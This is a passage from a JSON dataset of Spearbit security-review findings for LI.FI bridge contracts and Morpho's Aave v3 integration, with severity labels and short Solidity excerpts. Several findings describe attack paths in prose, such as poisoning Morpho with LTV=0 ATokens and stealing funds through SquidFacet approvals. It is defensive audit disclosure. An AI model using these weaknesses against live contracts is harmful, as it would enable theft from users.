        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "LibSwap.swap() emits the following emit AssetSwapped( transactionId, _swap.callTo, _swap.sendingAssetId, _swap.receivingAssetId, _swap.fromAmount, newBalance > initialReceivingAssetBalance // toAmount ? newBalance - initialReceivingAssetBalance : newBalance, block.timestamp ); It will be difficult to interpret the value emitted for toAmount as the observer won't know which of the two values has been emitted.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Storage slots derived from hashes are prone to pre-image attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Storage slots manually constructed using keccak hash of a string are prone to storage slot collision as the pre-images of these hashes are known. Attackers may find a potential path to those storage slots using the keccak hash function in the codebase and some crafted payload.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incorrect arguments compared in SquidFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "startBridgeTokensViaSquid () reverts if (_squidData.sourceCalls.length > 0) != _bridge- Data.hasSourceSwaps. Here, _squidData.sourceCalls is an argument passed to Squid Router, and _bridge- Data.hasSourceSwaps refers to source swaps done by SquidFacet. Ideally, _bridgeData.hasSourceSwaps should be false for this function (though it's not enforced) which means _squidData.sourceCalls.length has to be 0 for it to successfully execute.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unsafe casting of bridge amount from uint256 to uint128",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The issue with the code is that it performs an unsafe cast from a uint256 value to a uint128 value in the call to initiateTeleport() function. The _bridgeData.minAmount parameter passed to this function is of type uint256, but it is cast to uint128 without any checks, which may result in a loss of precision or even an overflow. function _startBridge(ILiFi.BridgeData memory _bridgeData) internal { LibAsset.maxApproveERC20( IERC20(dai), address(teleportGateway), _bridgeData.minAmount ); teleportGateway.initiateTeleport( l1Domain, _bridgeData.receiver, uint128(_bridgeData.minAmount) + );",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Cache s.anyTokenAddresses[_bridgeData.sendingAssetId]",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function _startBridge() of MultichainFacet contains the following expresssion. This retrieves the value for s.anyTokenAddresses[_bridgeData.sendingAssetId] twice. It might save some gas to first store this in a tmp variable. s.anyTokenAddresses[_bridgeData.sendingAssetId] != address(0) ? ,! s.anyTokenAddresses[_bridgeData.sendingAssetId]: ...",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "DeBridgeFacet permit seems unusable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function deBridgeGate.send() takes a parameter permit. This can only be used if it's signed by the Diamond, see DeBridgeGate.sol#L654-L662. As there is no code to let the Diamond sign a permit, this function doesn't seem usable. function _startBridge(...) ... { ... deBridgeGate.send{ value: nativeAssetAmount }(..., _deBridgeData.permit, ...); ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant checks in CircleBridgeFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function swapAndStartBridgeTokensViaCircleBridge() contains both noNativeAsset() and onlyAllowSourceToken(). The check noNativeAsset() is not necessary as onlyAllowSourceToken() already verifies the sendingAssetId isn't a native token. 22 function swapAndStartBridgeTokensViaCircleBridge(...) ... { ... noNativeAsset(_bridgeData) onlyAllowSourceToken(_bridgeData, usdc) { ... } modifier noNativeAsset(ILiFi.BridgeData memory _bridgeData) { if (LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) { revert NativeAssetNotSupported(); } _; } modifier onlyAllowSourceToken(ILiFi.BridgeData memory _bridgeData, address _token) { if (_bridgeData.sendingAssetId != _token) { revert InvalidSendingToken(); } _; }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant check on _swapData",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "This check is not present in the majority of the facets if (_swapData.length == 0) { revert NoSwapDataProvided(); } Ultimately, it's not required as _depositAndSwap() reverts when length is 0.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Duplicate checks done",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "In highlighted cases, a check has been done multiple times at different places:  validateBridgeData modifier on ArbitrumBridgeFacet. _startBridge() does checks already done by functions from which it's called.  depositAsset() does some checks already done by AmarokFacet.startBridgeTokensViaAmarok().",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "calldata can be used instead of memory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "When the incoming argument is constant, calldata can be used instead of memory to save gas on copying it to memory. This remains true for individual array elements.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Further gas optimizations for HopFacetOptimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "For the contract HopFacetOptimized it is very important to be gas optimized. Especially on Arbritrum, it is relatively expensive due to the calldata. 24 struct HopData { uint256 bonderFee; uint256 amountOutMin; uint256 deadline; uint256 destinationAmountOutMin; uint256 destinationDeadline; IHopBridge hopBridge; } struct BridgeData { bytes32 transactionId; string bridge; string integrator; address referrer; address sendingAssetId; address receiver; uint256 minAmount; uint256 destinationChainId; bool hasSourceSwaps; bool hasDestinationCall; } function startBridgeTokensViaHopL1ERC20( ILiFi.BridgeData calldata _bridgeData, HopData calldata _hopData ) external { // Deposit assets LibAsset.transferFromERC20(...); _hopData.hopBridge.sendToL2(...); emit LiFiTransferStarted(_bridgeData); } function transferFromERC20(...) ... { if (assetId == NATIVE_ASSETID) revert NullAddrIsNotAnERC20Token(); if (to == NULL_ADDRESS) revert NoTransferToNullAddress(); IERC20 asset = IERC20(assetId); uint256 prevBalance = asset.balanceOf(to); SafeERC20.safeTransferFrom(asset, from, to, amount); if (asset.balanceOf(to) - prevBalance != amount) revert InvalidAmount(); }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "payable keyword can be removed for some bridge functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "For the above highlighted functions, the native token is never forwarded to the underlying bridge. In these cases, payable keyword and related modifier refundExcessNative(payable(msg.sender)) can be re- moved to save gas.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "AmarokData.callTo can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "AmarokFacet's final receiver can be different from _bridgeData.receiver address receiver = _bridgeData.hasDestinationCall ? _amarokData.callTo : _bridgeData.receiver; Since both _amarokData.callTo and _bridgeData.receiver are passed by the caller, AmarokData.callTo can be removed, and _bridgeData.receiver can be assumed as the final receiver.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use requiredEther variable instead of adding twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The cost and nativeAmount are added twice to calculate the requiredEther variable, which can lead to increased gas consumption.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "refundExcessNative modifier can be gas-optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The highlighted code above can be gas-optimized by removing 1 if condition.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "BridgeData.hasSourceSwaps can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The field hasSourceSwaps can be removed from the struct BridgeData. _swapData is enough to identify if source swaps are needed.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary validation argument for native token amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Since both msg.value and feeAmount is controlled by the caller, you can remove feeAmount as an argument and assume msg.value is what needs to be collected. This will save gas on comparing these two values and refunding the extra.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Restrict access for cBridge refunds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "cBridge refunds need to be triggered from the contract that sent the transaction to cBridge. This can be done using the executeCallAndWithdraw function. As the function is not cBridge specific it can do any calls for the Diamond contract. Restricting what that function can call would allow more secure automation of refunds.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Stargate now supports multiple pools for the same token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The Stargate protocol now supports multiple pools for the same token on the same chain, each pool may be connected to one or many other chains. It is not possible to store a one-to-one token-to-pool mapping.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Expose receiver in GenericSwapFacet facet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Other than the bridge facets the swap facet does not emit the receiver of a transaction yet.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Track the destination chain on ServiceFeeCollector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "ServiceFeeCollector collects gas fees to send to the destination chain. For example /// @param receiver The address to send gas to on the destination chain function collectTokenGasFees( address tokenAddress, uint256 feeAmount, address receiver ) However, the destination chain is never tracked in the contract.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Executor can reuse SwapperV2 functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Executor.sol's noLeftOvers and _fetchBalances() is copied from SwapperV2.sol.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider adding onERC1155Received",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "In addition to ERC721, NFTs can be created using ERC1155 standard. Since, the use case of purchasing an NFT has to be supported, support for ERC1155 tokens can be added.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "SquidFacet uses a different string encoding library",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "SquidFacet uses an OZ library to convert address to string, whereas the underlying bridge uses a different library. Fuzzing showed that these implementations are equivalent.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Assembly in StargateFacet can be replaced with Solidity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function toBytes() contains assembly code that can also be replaced with solidity code. Also, see how-to-convert-an-address-to-bytes-in-solidity. 30 function toBytes(address _address) private pure returns (bytes memory) { bytes memory tempBytes; assembly { let m := mload(0x40) _address := and(_address,0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF) mstore(add(m, 20),xor(0x140000000000000000000000000000000000000000, _address) ) mstore(0x40, add(m, 52)) tempBytes := m } return tempBytes; }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Doublecheck quoteLayerZeroFee()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function quoteLayerZeroFee uses msg.sender to determine a fee, while _startBridge() uses _bridgeData.receiver to execute  router.swap. This might give different results. function quoteLayerZeroFee(...) ... { return router.quoteLayerZeroFee( ... , toBytes(msg.sender) ); } function _startBridge(...) ... router.swap{ value: _stargateData.lzFee }(..., toBytes(_bridgeData.receiver), ... ); ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing modifier refundExcessNative()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function swapAndStartBridgeTokensViaXDaiBridge() of GnosisBridgeFacet() and Gnosis- BridgeL2Facet() don't have the modifier refundExcessNative(). While other Facets have such a modifier.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Special case for cfUSDC tokens in CelerIMFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function startBridgeTokensViaCelerIM() has a special case for cfUSDC tokens, whereas swapAndStartBridgeTokensViaCelerIM() doesn't have this. function startBridgeTokensViaCelerIM(...) ... { if (!LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) { if (...) { // special case for cfUSDC token asset = IERC20(CelerToken(_bridgeData.sendingAssetId).canonical()); } else { ... } } ... } function swapAndStartBridgeTokensViaCelerIM(...) ... { ... if (!LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) { // no special case for cfUSDC token } ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "External calls of SquidFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The functions CallBridge and CallBridgeCall do random external calls. This is done via a sepa- rate contract multicall SquidMulticall. This might be used to try reentrancy attacks. function _startBridge(...) ... { ... squidRouter.bridgeCall{ value: msgValue }(...); ... squidRouter.callBridgeCall{ value: msgValue }(...); ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing test coverage for triggerRefund Function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The current test suite does not include test cases for the triggerRefund function. This oversight may lead to undetected bugs or unexpected behavior in the function's implementation.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Implicit assumption in MakerTeleportFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function _startBridge() of MakerTeleportFacet has the implicit assumption that dai is an ERC20 token. However on GnosisChain the native asset is (x)dai. Note: DAI on GnosisChain is an ERC20, so unlikely this would be a problem in practice. function _startBridge(ILiFi.BridgeData memory _bridgeData) internal { LibAsset.maxApproveERC20( IERC20(dai),...); ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Robust allowance handling in maxApproveERC20()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Some tokens, like USDT, require setting the approval to 0 before setting it to another value. The function SafeERC20.safeIncreaseAllowance() doesn't do this. Luckily maxApproveERC20() sets the allowance so high that in practice this never has to be increased. function maxApproveERC20(...) ... { ... uint256 allowance = assetId.allowance(address(this), spender); if (allowance < amount) SafeERC20.safeIncreaseAllowance(IERC20(assetId), spender, MAX_UINT - allowance); }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused re-entrancy guard",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The RelayerCelerIM.sol#L21 includes a redundant re-entrancy guard, which adds an extra layer of protection against re-entrancy attacks. While re-entrancy guards are crucial for securing contracts, this particular guard is not used.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant duplicate import in the LIFuelFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The current LIFuelFacet.sol contains a redundant duplicate import. Identifying and removing dupli- cate imports can streamline the contract and improve maintainability.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Extra checks in executeMessageWithTransfer()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function executeMessageWithTransfer() of RelayerCelerIM ignore the first parameter. seems this could be used to verify the origin of the transaction, which could be an extra security measure. It * @param * (unused) The address of the source app contract function executeMessageWithTransfer(address, ...) ... { }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Variable visibility is not uniform",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "In the current facets, state variables like router/messenger visibilities are not uniform, with some variables declared as public while others are private. thorchainRouter => is defined as public. synapseRouter => is defined as public. deBridgeGate => is defined as private",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Library LibMappings not used everywhere",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The library LibMappings is used in several facets. However, it is not used in the following facets  ReentrancyGuard  AxelarFacet  HopFacet.sol  MultichainFacet  OptimismBridgeFacet  OwnershipFacet",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "transferERC20() doesn't have a null address check for receiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "LibAsset.transferFromERC20() has a null address check on the receiver, but transferERC20() does not.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "LibBytes can be improved",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The following functions are not used  concat()  concatStorage()  equal()  equalStorage()  toBytes32()  toUint128()  toUint16()  toUint256()  toUint32()  toUint64()  toUint8()  toUint96() The call to function slice() for calldata arguments (as done in AxelarExecutor) can be replaced with the in-built slicing provided by Solidity. Refer to its documentation.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Keep generic errors in the GenericErrors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been noticed that some of the contracts are re-defined errors. The generic errors like a WithdrawFailed can be kept in the GenericErrors.sol",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Attention points for making the Diamond immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "There are additional attention points to decide upon when making the Diamond immutable: After removing the Owner, the following functions won't work anymore:  AccessManagerFacet.sol - setCanExecute()  AxelarFacet.sol - setChainName()  HopFacet.sol - registerBridge()  MultichainFacet.sol - updateAddressMappings() & registerRouters()  OptimismBridgeFacet.sol - registerOptimismBridge()  PeripheryRegistryFacet.sol - registerPeripheryContract()  StargateFacet.sol - setStargatePoolId() & setLayerZeroChainId()  WormholeFacet.sol - setWormholeChainId() & setWormholeChainIds() There is another authorization mechanism via LibAccess, which arranges access to the functions of  DexManagerFacet.sol  WithdrawFacet.sol Several Periphery contracts also have an Owner:  AxelarExecutor.sol  ERC20Proxy.sol  Executor.sol  FeeCollector.sol  Receiver.sol  RelayerCelerIM.sol  ServiceFeeCollector.sol Additionally ERC20Proxy has an authorization mechanism via authorizedCallers[]",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check on the final asset in _swapData",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "MakerTeleportFacet verifies that the final received asset in _swapData is DAI. This check is not present in majority of the facets (including CircleBridgeFacet). Ideally, every facet should have the check that the final receivingAssetId is equal to sendingAssetId.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Discrepancies in pragma versioning across faucet implementations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The use of different pragma versions in facet implementations can present several implications, with potential risks and compliance concerns that need to be addressed to maintain robust and compliant contracts.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent use of validateDestinationCallFlag()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Highlighted code can be replaced with a call to validateDestinationCallFlag() function as done in other Facets.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent utilization of the isNativeAsset function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The isNativeAsset function is designed to distinguish native assets from other tokens within facet- based smart contract implementations. However, it has been observed that the usage of the isNativeAsset function is not consistent across various facets. Ensuring uniform application of this function is crucial for maintaining the accuracy and reliability of the asset identification and processing within the facets.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused events/errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The contracts contain several events and error messages that are not used anywhere in the contract code. These unused events and errors add unnecessary code to the contract, increasing its size.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Make bridge parameters dynamic by keeping them as a parameter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The current implementation has some bridge parameters hardcoded within the smart contract. This approach limits the flexibility of the contract and may cause issues in the future when upgrades or changes to the bridge parameters are required. It would be better to keep the bridge parameters as a parameter to make them dynamic and easily changeable in the future. HopFacetOptimized.sol => Relayer & RelayerFee MakerTeleportFacet.sol's => Operator person (or specified third party) responsible for initiating minting process on destination domain by providing (in the fast path) Oracle attestations.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The highlighted comment incorrectly refers USDC address as DAI address.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant console log",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The contract includes Console.sol from test file, which is only used for debugging purposes. In- cluding it in the final version of the contract can increase the contract size and consume more gas, making it more expensive to deploy and execute.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "SquidFacet doesn't revert for incorrect routerType",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "If _squidData.routeType passed by the user doesn't match BridgeCall, CallBridge, or Call- BridgeCall, SquidFacet just takes the funds from the user and returns without calling the bridge. This, when the combined with the issue \"Max approval to any address is possible\", lets anyone steal those funds. Note: Solidity enum checks should prevent this issue, but it is safer to do an extra check.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Side effects of LTV = 0 assets: Morpho's users will not be able to withdraw (collateral and \"pure\" supply), borrow and liquidate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When an AToken has LTV = 0, Aave restricts the usage of some operations. In particular, if the user owns at least one AToken as collateral that has LTV = 0, operations could revert. 1) Withdraw: if the asset withdrawn is collateral, the user is borrowing something, the operation will revert if the withdrawn collateral is an AToken with LTV > 0. 2) Transfer: if the from is using the asset as collateral, is borrowing something and the asset transferred is an AToken with LTV > 0 the operation will revert. 3) Set the reserve of an AToken as not collateral: if the AToken you are trying to set as non-collateral is an AToken with LTV > 0 the operation will revert. Note that all those checks are done on top of the \"normal\" checks that would usually prevent an operation, de- pending on the operation itself (like, for example, an HF check). While a \"normal\" Aave user could simply withdraw, transfer or set that asset as non-collateral, Morpho, with the current implementation, cannot do it. Because of the impossibility to remove from the Morpho wallet the \"poisoned AToken\", part of the Morpho mechanics will break.  Morpho's users could not be able to withdraw both collateral and \"pure\" supply  Morpho's users could not be able to borrow  Morpho's users could not be able to liquidate  Morpho's users could not be able to claim rewards via claimRewards if one of those rewards is an AToken with LTV > 0",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Morpho is vulnerable to attackers sending LTV = 0 collateral tokens, supply/supplyCollateral, bor- row and liquidate operations could stop working",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When an AToken has LTV = 0, Aave restricts the usage of some operations. In particular, if the user owns at least one AToken as collateral that has LTV = 0, these operations could revert 1) Withdraw: if the asset withdrawn is collateral, the user is borrowing something, the operation will revert if the withdrawn collateral is an AToken with LTV > 0 2) Transfer: if the from is using the asset as collateral, is borrowing something and the asset transferred is an AToken with LTV > 0 the operation will revert 3) Set the reserve of an AToken as not collateral: if the AToken you are trying to set as non-collateral is an AToken with LTV > 0 the operation will revert Note that all those checks are done on top of the \"normal\" checks that would usually prevent an operation, de- pending on the operation itself (like, for example, an HF check). In the attack scenario, the bad actor could simply supply an underlying that is associated with an LTV = 0 AToken and transfer it to the Morpho contract. If the victim does not own any balance of the asset, it will be set as collateral and the victim will suffer from all the side effects previously explained. While a \"normal\" Aave user could simply withdraw, transfer or set that asset as non-collateral, Morpho, with the current implementation, cannot do it. Because of the impossibility to remove from the Morpho wallet the \"poisoned AToken\", part of the Morpho mechanics will break.  Morpho's users could not be able to withdraw both collateral and \"pure\" supply. 6  Morpho's users could not be able to borrow.  Morpho's users could not be able to liquidate.  Morpho's users could not be able to claim rewards via claimRewards if one of those rewards is an AToken with LTV > 0.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Morpho is not correctly handling the asset price in _getAssetPrice when isInEMode == true but priceSource is addres(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The current implementation of _getAssetPrice returns the asset's price based on the value of isInEMode function _getAssetPrice(address underlying, IAaveOracle oracle, bool isInEMode, address priceSource) internal view returns (uint256) if (isInEMode) { uint256 eModePrice = oracle.getAssetPrice(priceSource); if (eModePrice != 0) return eModePrice; } return oracle.getAssetPrice(underlying); { } As you can see from the code, if isInEMode is equal to true they call oracle.getAssetPrice no matter what the value of priceSource that could be address(0). 7 If we look inside the AaveOracle implementation, we could assume that in the case where asset is address(0) (in this case, Morpho pass priceSource _getAssetPrice parameter) it would probably return _fallbackOra- cle.getAssetPrice(asset). In any case, the Morpho logic diverges compared to what Aave implements. On Aave, if the user is not in e-mode, the e-mode oracle is address(0) or the asset's e-mode is not equal to the user's e-mode (in case the user is in e-mode), Aave always uses the asset price of the underlying and not the one in the e-mode priceSource. The impact is that if no explicit eMode oracle has been set, Morpho might revert in price computations, breaking liquidations, collateral withdrawals, and borrows if the fallback oracle does not support the asset, or it will return the fallback oracle's price which is different from the price that Aave would use.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
